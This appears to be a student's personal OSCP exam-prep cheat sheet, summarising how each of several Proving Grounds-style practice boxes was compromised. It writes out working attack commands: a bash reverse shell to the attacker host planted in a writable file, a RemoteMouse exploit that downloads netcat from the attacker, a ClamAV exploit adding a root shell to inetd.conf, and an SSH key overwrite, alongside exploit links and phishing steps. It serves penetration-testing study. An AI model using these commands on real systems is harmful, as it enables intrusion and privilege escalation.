
#### OSCP A, Box 1 => Aerospike db 
1. Scan port 3003, exploit = https://github.com/b4ny4n/CVE-2020-13151 
2. Use pspy + find writable files = `echo "/bin/bash -c 'bash -i >& /dev/tcp/{{LHOST}}/443 0>&1'" > /opt/aerospike/bin/asadm` 

#### OSCP A, Box 2 => Git, zip files 
1. Scanning ports showed .git on 80, use 'git-dumper' and read commits to get creds. 
2. Copyfail worked; alternative is find writable files then zip2john the zip files to get creds. 

#### OSCP A, Box 3 => Wifi mouse, putty rdp 
1. Scanning ports showed 1978, exploit = `python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.230.199 -v --cmd 'powershell -c "curl http://{{LHOST}}/nc64.exe -o C:/Windows/Temp/nc.exe"'` 
2. Check for unusual programs installed, eg 'PuTTY', and where they can store creds. 

---- 


#### AuthBy => FTP default creds 
1. Also try admin:admin on FTP! Upload shell.php 

#### ClamAV => SNMP 
1. nmap -sU -p161 --script *snmp* $target 
2. perl 4761.pl $target    # <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"> 

#### Exghost => FTP 
Try = https://github.com/rix4uni/FTPBruteForce.git 

#### Hepet => Phishing email 
- Get creds from website, read IMAP emails, attach .ods in phishing email; PowerUp, replace exe with cmd. 
- IMAP details = https://banua.medium.com/proving-grounds-hepet-oscp-prep-2025-practice-17-3bdc3ad86495 

#### Sorcerer => ssh + scp hack 
1. Fucking rustscan missed port 7742, grab zip files to get ssh key (& tomcat creds but cant use) 
2. Delete crap at start of key file till 'ssh-rsa' then `scp -O -i id_rsa authorized_keys max@{{RHOST}}:/home/max/.ssh/authorized_keys` 

---- 


#### LazySysAdmin => SMB 
1. Check smb 'share$' to get user & mysql creds. 

#### Nibbles => PostgreSQL 
1. Just whack default creds when unable to find anything else. 
2. Exploit = https://github.com/squid22/PostgreSQL_RCE 


If looking for mysql creds, try 'mysql_user' or 'mysql_pass'. 
Use to look for exploits: ` sudo nmap -sVC -vvv {{TARGET_IP}} --script vuln `. 
